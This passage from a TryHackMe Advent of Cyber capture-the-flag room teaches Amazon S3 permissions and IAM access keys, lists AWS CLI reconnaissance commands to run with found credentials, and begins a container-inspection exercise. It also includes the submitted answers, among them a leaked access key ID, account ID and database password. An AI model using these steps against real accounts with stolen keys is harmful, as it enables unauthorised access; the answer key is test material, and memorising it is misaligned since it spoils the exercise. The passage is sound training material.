of Amazon S3 Authentication</span></h3><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">In Amazon S3, Object permissions are different from Bucket permissions. Bucket permissions allow you to list the objects in a bucket, while the object's permissions will enable you to download the object. In the case of the irs-form-990 bucket, both the bucket and all the objects in the bucket are publicly readable. But that doesn't have to be the case. Objects can be readable while the bucket is not, or the bucket can be publicly readable, but the Objects are not. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Note: you can also have public write permissions to a Bucket. This is generally a bad idea and has been the vector of several </span><a href=\"https://www.theregister.com/2018/02/22/la_times_amazon_aws_s3/\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">crypto-mining incidents</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">There are also two levels of public buckets and objects. The first level is \"Anyone.\" This is what you experienced with the irs-form-990 bucket. You could just hit that URL from your local browser. The second level is just as public - and that is public to </span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">Any AWS Customer </span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">(what AWS foolishly called </span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">AuthenticatedUsers</span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"> for many years). Anyone with a credit card can create an AWS account; therefore, Authenticated Users doesn't provide much data protection.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"><br /></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"><br /></span></p><table class=\"table table-bordered\" style=\"width:1076px\"><tbody><tr><td><span style=\"font-weight:bolder\">ACL Name</span></td><td><span style=\"font-weight:bolder\">BUCKET</span></td><td><span style=\"font-weight:bolder\">OBJECT</span></td></tr><tr><td><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><span style=\"font-weight:bolder\">Anyone</span></span><br /></td><td><p style=\"line-height:1\">Anonymously list contents of</p><p style=\"line-height:1\">the bucket via curl or with</p><p style=\"line-height:1\"><span style=\"font-family:&quot;Courier New&quot;\">aws s3 ls --no-sign-request</span></p></td><td><p style=\"line-height:1\">Ability to download via curl <span style=\"font-size:1rem\">or</span></p><p style=\"line-height:1\"><span style=\"font-family:&quot;Courier New&quot;\">aws s3 cp --no-sign-request</span></p></td></tr><tr><td><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><span style=\"font-weight:bolder\">AuthenticatedUsers</span></span><br /></td><td><p style=\"line-height:1\">Can only list the bucket with</p><p style=\"line-height:1\">active AWS keys via</p><p style=\"line-height:1\"><span style=\"font-size:1rem\"><span style=\"font-family:&quot;Courier New&quot;\">aws s3 ls</span>  </span></p></td><td><p style=\"line-height:1\">You can only download the object with</p><p style=\"line-height:1\">active AWS Keys <span style=\"font-size:1rem\">via</span></p><p style=\"line-height:1\"><span style=\"font-size:1rem;font-family:&quot;Courier New&quot;\">aws s3 cp</span></p></td></tr></tbody></table><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-size:24px\">AWS IAM</span><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\">Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.</p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-family:Arial;white-space:pre-wrap;font-size:14.6667px;background-color:rgb(255, 255, 0)\"><br /></span><span style=\"font-size:18px\">IAM Access Keys </span><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">IAM Access Keys consist of an Access Key ID and the Secret Access Key. </span><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/6145d05439d48b00410b94bc/room-content/1f7ab6455d2d05b210730bacf7d69cdf.png\" class=\"note-float-right\" style=\"float:right;width:127.933px;height:124.469px\" /></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Access Key IDs always begin with the letters AKIA and are 20 characters long. These act as a user name for the AWS API.  The Secret Access Key is 40 characters long. AWS generates both strings; however, AWS doesn't make the Secret Access Key available to download after the initial generation. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">There is another type of credentials, short-term credentials, where the Access Key ID begins with the letters ASIA and includes an additional string called the Session Token. </span></p><h3><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:18px\">Conducting Reconnaissance with IAM</span></h3><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">When you find credentials to AWS, you can add them to your AWS </span><a href=\"https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">Profile</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"> in the AWS CLI. For this, you use the command:</span><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/6145d05439d48b00410b94bc/room-content/b1461c9a9c0d297a9e3d95b3064cf903.png\" class=\"note-float-right\" style=\"float:right\" /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">aws configure --profile PROFILENAME</code><span style=\"font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">This command will add entries to the</span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><code style=\"font-size:14px\">.aws/config</code><span style=\"font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">and</span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><code style=\"font-size:14px\">.aws/credentials</code><span style=\"font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">files in your user's home directory. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Once you have configured a new profile with the new access keys, you can execute any command using this other set of credentials. For example, to list all the S3 Buckets in the AWS account you have found credentials for, try:</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">aws s3 ls --profile PROFILENAME</code><span style=\"font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">ProTip: Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">A few other common AWS reconnaissance techniques are:</span></p><ol><li style=\"list-style-type:decimal;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Finding the Account ID belonging to an access key:</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">aws sts get-access-key-info --access-key-id AKIAEXAMPLE</code><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"></span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"> </span></p></li><li style=\"list-style-type:decimal;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Determining the Username the access key you're using belongs to</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">aws sts get-caller-identity --profile PROFILENAME</code></p></li><li style=\"list-style-type:decimal;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Listing all the EC2 instances running in an account</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">aws ec2 describe-instances --output text --profile PROFILENAME</code></p></li><li style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\">Listing all the EC2 instances running in an account in a different region<br /><code style=\"font-size:14px\">aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME</code></li></ol><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-size:18px\">AWS ARNs</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\">An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.</p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\">The format is:</p><p style=\"margin-top:0pt;margin-bottom:0pt;background-color:transparent;color:rgb(0, 0, 0);font-family:Arial;font-size:11pt;white-space:pre;line-height:1.38\"><span style=\"font-family:&quot;Courier New&quot;\">arn:aws:&lt;service&gt;:&lt;region&gt;:&lt;account_id&gt;:&lt;resource_type&gt;/&lt;resource_name&gt;</span></p><p></p><p style=\"font-variant-numeric:normal;font-variant-east-asian:normal;background-color:transparent;list-style-type:decimal;font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);vertical-align:baseline;white-space:pre\"></p><ul></ul><p></p><h2><span style=\"font-size:16pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\">Challenge</span></h2><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Somehow, the Grinch has managed to get hold of all the Elves' names and email addresses. How could this have happened? Given the scope of the breach, McSkidy believes someone in HR must be involved. You know that HR recently launched a new portal site using WordPress. You also know that HR didn't request any infrastructure from IT to deploy this portal site. Where is that portal hosted?</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Here is the image HR sent out announcing the new site:</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><img src=\"https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png\" style=\"width:538px\" /><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Based on that, can you figure out how the Grinch got access to the employee database?</span></p>","taskType":"none","taskNo":22,"taskCreated":"2021-11-16T13:47:50.106Z","taskDeadline":null,"tasksInfo":[{"question":"What is the name of the S3 Bucket used to host the HR Website announcement?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"images.bestfestivalcompany.com","noAnswer":false,"answerDesc":"Answer format: ******.*******************.***"},{"question":"<p>What is the message left in the flag.txt object from that bucket?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"It's easy to get your elves data when you leave it so easy to find!","noAnswer":false,"answerDesc":"Answer format: **** **** ** *** **** ***** **** **** *** ***** ** ** **** ** *****"},{"question":"<p>What other file in that bucket looks interesting to you?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"wp-backup.zip","noAnswer":false,"answerDesc":"Answer format: *********.***"},{"question":"<p>What is the AWS Access Key ID in that file?<br /></p>","hint":"Hint: If you cannot curl the file, can you download it via the AWS CLI? Remember the string you're looking for begins with AKIA.","questionNo":4,"correct":true,"extraPoints":0,"attempts":1,"submission":"AKIAQI52OJVCPZXFYAOI","noAnswer":false,"answerDesc":"Answer format: ********************"},{"question":"<p>What is the AWS Account ID that access-key works for?<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"019181489476","noAnswer":false,"answerDesc":"Answer format: ************"},{"question":"<p>What is the Username for that access-key?<br /></p>","hint":"","questionNo":6,"correct":true,"extraPoints":0,"attempts":1,"submission":"ElfMcHR@bfc.com","noAnswer":false,"answerDesc":"Answer format: ***********.***"},{"question":"<p>There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?<br /></p>","hint":"","questionNo":7,"correct":true,"extraPoints":0,"attempts":1,"submission":"HR-Portal","noAnswer":false,"answerDesc":"Answer format: *********"},{"question":"<p>What is the database password stored in Secrets Manager?<br /></p>","hint":"Hint: the AWS CLI commands for Secrets manager can be found by running `aws secretsmanager help` You'll first need to list all the secrets, then you can get the secret value. Remember to specify a region that looks similar to `XX-north-X`.","questionNo":8,"correct":true,"extraPoints":0,"attempts":1,"submission":"Winter2021!","noAnswer":false,"answerDesc":"Answer format: ***********"}],"uploadId":"","questions":[{"questionNo":1,"question":"What is the name of the S3 Bucket used to host the HR Website announcement?","hint":""},{"questionNo":2,"question":"<p>What is the message left in the flag.txt object from that bucket?<br /></p>","hint":""},{"questionNo":3,"question":"<p>What other file in that bucket looks interesting to you?<br /></p>","hint":""},{"questionNo":4,"question":"<p>What is the AWS Access Key ID in that file?<br /></p>","hint":"Hint: If you cannot curl the file, can you download it via the AWS CLI? Remember the string you're looking for begins with AKIA."},{"questionNo":5,"question":"<p>What is the AWS Account ID that access-key works for?<br /></p>","hint":""},{"questionNo":6,"question":"<p>What is the Username for that access-key?<br /></p>","hint":""},{"questionNo":7,"question":"<p>There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?<br /></p>","hint":""},{"questionNo":8,"question":"<p>What is the database password stored in Secrets Manager?<br /></p>","hint":"Hint: the AWS CLI commands for Secrets manager can be found by running `aws secretsmanager help` You'll first need to list all the secrets, then you can get the secret value. Remember to specify a region that looks similar to `XX-north-X`."}]},{"taskTitle":"[Day 18] <span class=\"badge badge-soft-purple size-16\">Cloud</span> Playing With Containers","taskDesc":"<p><code>\n    Please note: If you are on the TryHackMe free plan, the attack box does not have internet access and cannot reach AWS. You will need to install curl and the AWS CLI on your own machine in order to complete this challenge. Instructions for installing the AWS CLI are here: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html</code></p>\n    \n    <h2><span style=\"font-size:24px\">Check out John Hammond's walkthrough video for day 18 </span><a href=\"https://www.youtube.com/watch?v=jpRTzb1eZQ4\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><h3>Premise</h3>\n    \n    <p>Grinch Enterprises has been gloating about their attack on an underground forum. We know they were specifically targeting organizations in a campaign they've themed \"Advent of Cyber\" (AOC) - what a frustrating coincidence. Tracing the user back over time - we also encountered a reference to using AWS Elastic Container Registry (ECR) to store container images they use as infrastructure in their attacks. Let's see if we can find out more about the attack tooling Grinch Enterprises is using.</p>\n    \n    <h3>Getting Started</h3>\n    \n    <p>You'll need to start your AttackBox to run commands using the Docker container tool. Containers are a virtualization mechanism similar to Virtual Machines (VMs), and container images are based on the <a href=\"https://opencontainers.org/\" target=\"_blank\">Open Container Initiative</a> <a href=\"https://github.com/opencontainers/distribution-spec/blob/main/spec.md\" target=\"_blank\">Distribution Specification</a>. However, when someone talks about \"Docker\" or \"containers\", they often are talking about multiple container technologies that work together. Specifically, the term \"Docker\" is used to describe:</p>\n    \n    \n    <ul><li>Docker API - a local communication interface on a configured Linux machine, with standardized commands used to communicate with a Docker Daemon.</li>\n    \n    <li>Docker Daemon - a process that runs on your machine (the Docker daemon), to interact with container components such as images, data volumes, and other container artifacts.</li>\n    \n    <li>Docker Container Image Format - ultimately a .tar file. For Version 1, the docker image format was not strictly compliant with the OCI <a href=\"https://github.com/opencontainers/image-spec\" target=\"_blank\">Image Specification</a>. For our purposes, this won't change how we interact with container images in this exercise, but it does slightly change the format and content of a container image.</li>\n    </ul>\n    \n    <p>Now that we've gotten some of the basic terminologies out of the way, let's get started with today's learning objective.</p>\n    \n    <h3>Today's Learning Objective - AWS Elastic Container Registry - ECR Public Gallery</h3>\n    \n    <p>Today we'll be covering the basics of container images and AWS Elastic Container Registry (<a href=\"https://aws.amazon.com/ecr/\" target=\"_blank\">ECR</a>) - an online registry for public and private container images. We'll learn about how to retrieve a container image from an online registry and inspect the elements of that container image to identify potential security issues.</p>\n    \n    <h3>Docker Images and Amazon Elastic Container Registry</h3>\n    \n    <p>In a cloud-native computing environment, containers are a first-choice solution for deploying infrastructure. Similar to virtual machines, containers serve as the compute fabric for many running applications and hosted processes in the cloud.</p>\n    \n    <p>Once you've logged on to an AttackBox, you can run the following command to see the container images that are stored by default on your AttackBox:</p>\n    \n    <p><code>docker images</code></p>\n    \n    <p>which should return an output similar to the following:</p>\n    \n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                Docker Images\n            </div>\n            <pre class=\"terminal-code\"><code class=\"language-shell-session\">root@ip-10-10-20-249:~# docker images\nREPOSITORY           TAG                 IMAGE ID            CREATED             SIZE\nremnux/ciphey        latest              ec11b47184f6        9 months ago        177MB\nrustscan/rustscan    2.0.0               6890f34e17b0        12 months ago       41.6MB\nbcsecurity/empire    v3.5.2              cbd0b10f7f55        13 months ago       2.05GB\nmpepping/cyberchef   latest              36979d2c2b9e        17 months ago       639MB\nroot@ip-10-10-20-249:~#</code>\n            </pre>\n        </div>\n    </div>\n    \n    <p>Docker containers are stored in \"repositories\", which are a reference to file mappings the Docker daemon knows how to reach, which include the container .tar files. Each image in a repository will include an image tag, and images can be referenced using either their tag or Image ID.</p>\n    \n    <p>For example:</p>\n    \n    <p><code>remnux/ciphy:latest</code></p>\n    \n    <p>or</p>\n    \n    <p><code>ec11b47184f6</code></p>\n    \n    <h3>Grinch Enterprise Attack Infrastructure</h3>\n    \n    <p>We've traced the Grinch Enterprises attack infrastructure back to a likely Elastic Container Registry that is publicly accessible:</p>\n    \n    <img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/615df9ae73d1340061780f1b/room-content/45bbed41f4ce7e442de16b4c3e0a6f9a.png\" />\n    \n    <p><a href=\"https://gallery.ecr.aws/h0w1j9u3/grinch-aoc\">Link to Suspected AWS Public Container Gallery for Grinch Enterprises</a></p>\n    \n    <p>You can retrieve the potential Grinch Enterprises image by running the following command on your AttackBox:</p>\n    \n    <p><code>docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest</code></p>\n    \n    <p>which returns will return an output similar to the following:</p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                Docker Pull\n            </div>\n            <pre class=\"terminal-code\">               <code class=\"language-shell-session\">root@ip-10-10-20-249:~# docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest\nlatest: Pulling from h0w1j9u3/grinch-aoc\n7b1a6ab2e44d: Pull complete \n7181c3c4941b: Pull complete \n148b30b9ae2d: Pull complete \n6f5a7c388565: Pull complete \nef099323cb4a: Pull complete \nde5bf7e2abf0: Pull complete \n455d5424d859: Pull complete \nb1ee65a7e02a: Pull complete \na47021107475: Pull complete \nDigest: sha256:593c79eaaa1a905c533e389b0034022e074969da3936df648172c4efc8d421d8\nStatus: Downloaded newer image for public.ecr.aws/h0w1j9u3/grinch-aoc:latest\npublic.ecr.aws/h0w1j9u3/grinch-aoc:latest\nroot@ip-10-10-20-249:~#</code>\n</pre>\n</div>\n</div>\n    \n    \n    \n    <p>You can run the container and interact with it by running the following command:</p>\n    \n    <p><code>docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest</code></p>\n    \n    <p>which will open a shell inside the container image, as indicated by the $. Once inside the container, we can do a little reconnaissance:</p>\n    \n    <p><code>ls -la</code></p>\n    \n    <p>which shows there are no regular files or subdirectories in the present working directory.</p>\n    \n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                Docker Run\n            </div>\n            <pre class=\"terminal-code\">               <code class=\"language-shell-session\">root@ip-10-10-20-249:~# docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest\n$ ls -la\ntotal 20\ndrwxr-xr-x 2 newuser newuser 4096 Oct 21 20:31 .\ndrwxr-xr-x 1 root    root    4096 Oct 21 20:31 ..\n-rw-r--r-- 1 newuser newuser  220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 newuser newuser 3771 Feb 25  2020 .bashrc\n-rw-r--r-- 1 newuser newuser  807 Feb 25  2020 .profile\n$</code>\n</pre>\n</div>\n</div>\n    \n    <h3>Spoiler</h3>\n    <p>A good place to check next is environment variables - in Linux and especially for containers, environment variables may be used to store secrets or other sensitive information used to configure the container at run-time.</p>\n    \n    \n    <p>So we try <code>printenv</code> to learn more about the environment configurations where we see:</p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                printenv\n            </div>\n            <pre class=\"terminal-code\">               <code class=\"language-shell-session\">$ printenv\nHOSTNAME=c633e29bb404\nHOME=/home/newuser\nTERM=xterm\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\napi_key=a90eac086fd049ab9a08374f65d1e977\nPWD=/home/newuser\n$</code>\n            </pre>\n        </div>\n    </div>\n    \n    <p>and we have stumbled on an <code>api_key</code> which I'm guessing Grinch Enterprises didn't intend to leave behind.</p>\n    \n    <h3>Bonus Challenge</h3>\n    \n    <p>A container image is composed of a number of layers - perhaps there is sensitive information in an underlying container layer that Grinch Enterprises didn't clean up as part of their build process. One key reason that developers (and attackers) might package their application (or attack tools) in a container is that a container allows a developer to \"freeze\" an application and its dependencies into an image as part of the build process. The build process is part of the Software Development Lifecycle (SDLC), where applications and their dependencies are packaged together and tested prior to distribution and use.</p>\n    \n    <p>Once an image is built, running the container image will always result in the same configuration state as specified at build-time. Container images are built from a source file known as a<code>Dockerfile</code>. Dockerfiles are a list of new-line separated instructions that instruct the Docker daemon how to generate a container image. You can read an exhaustive explanation of how to write Dockerfiles in the <a href=\"https://docs.docker.com/engine/reference/builder/\">Dockerfile reference</a>. You can see an example of a Dockerfile <a href=\"https://docs.docker.com/samples/apt-cacher-ng/\">here</a>&gt;. In the case of Grinch Enterprises, we don't have the original Dockerfile - but with the container image, we have something just as good. Let's start by creating a new directory and saving the downloaded image as a .tar file.</p>\n    \n    <p>1. Create a new directory: <code>mkdir aoc</code></p>\n    \n    <p>2. Change directory to the newly created directory:<code>cd aoc</code></p>\n    \n    <p>3. Save the container image as a .tar file: <code>docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest</code></p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                Docker Save\n            </div>\n            <pre class=\"terminal-code\">               <code class=\"language-shell-session\">$ exit\nroot@ip-10-10-20-249:~# mkdir aoc\nroot@ip-10-10-20-249:~# cd aoc/\nroot@ip-10-10-20-249:~/aoc# docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest\nroot@ip-10-10-20-249:~/aoc#</code>\n</pre>\n</div>\n</div>\n    \n    \n    <p>Once we have saved the image, we can further inspect the image by unpacking the compressed file</p>\n    \n    <p><code>tar -xf aoc.tar</code></p>\n    \n    <p>Note that I used the -v (verbose) option when I performed the command, and you can see the various files that are being unpacked:</p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                tar -xvf\n            </div>\n            <pre class=\"terminal-code\"><code class=\"language-shell-session\">root@ip-10-10-20-249:~/aoc# tar -xvf aoc.tar\n40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/\n40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/VERSION\n40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/json\n40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/layer.tar\n4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/\n4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/VERSION\n4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/json\n4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/layer.tar\n4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/\n4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/VERSION\n4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/json\n4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/layer.tar\n4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/\n4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/VERSION\n4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/json\n4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/layer.tar\n619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/\n619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/VERSION\n619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/json\n619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/layer.tar\n9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/\n9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/VERSION\n9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/json\n9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/layer.tar\na3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/\na3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/VERSION\na3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/json\na3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/layer.tar\naa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/\naa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/VERSION\naa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/json\naa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/layer.tar\nf886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json\nfa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/\nfa28cd504eaba5e76b168c5149551371fb